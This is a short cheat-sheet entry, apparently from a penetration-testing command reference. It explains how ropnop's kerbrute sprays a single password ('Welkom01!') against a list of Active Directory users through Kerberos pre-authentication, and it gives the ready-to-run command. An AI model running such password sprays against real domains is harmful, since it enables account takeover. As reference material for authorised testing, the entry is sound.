---
title: |
  Enumerate valid AD accounts through Kerberos Pre-Auth using password spray
description: |
  ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will perform a password spray account against a list of provided users given a password.

  Command Reference:

  	Domain: test.local

  	Username List: domain_users.txt

  	Password: Welkom01!
command: |
  kerbrute passwordspray -d test.local domain_users.txt Welkom01!
items:
  - Password
services:
  - Kerberos
OS:
  - Linux
  - Windows
attack_types:
  - Enumeration
references:
  - https://github.com/ropnop/kerbrute
---
